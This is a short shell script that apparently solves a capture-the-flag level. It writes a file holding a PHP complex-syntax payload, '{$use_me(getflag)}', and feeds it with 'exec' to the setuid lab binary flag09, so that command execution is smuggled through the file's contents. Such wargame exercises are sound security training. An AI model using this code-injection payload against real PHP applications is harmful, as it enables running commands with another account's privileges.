set -x
echo "[email {\$use_me(getflag)}]" > ~/file
/home/flag09/flag09 ~/file exec
rm ~/file
exit 0
